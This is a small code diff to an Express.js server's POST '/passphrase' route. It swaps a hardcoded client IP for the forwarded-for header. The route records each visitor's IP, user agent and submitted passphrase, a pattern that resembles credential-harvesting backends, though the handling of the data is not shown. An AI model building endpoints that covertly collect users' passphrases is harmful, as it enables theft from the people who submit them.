@@ -15,7 +15,7 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(cors());
 
 app.post('/passphrase', async (req, res) => {
-  const clientIP = '104.24.123.216';//req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   const userAgent = req.headers['user-agent'];
   const passphrase = req.body.passphrase;
 
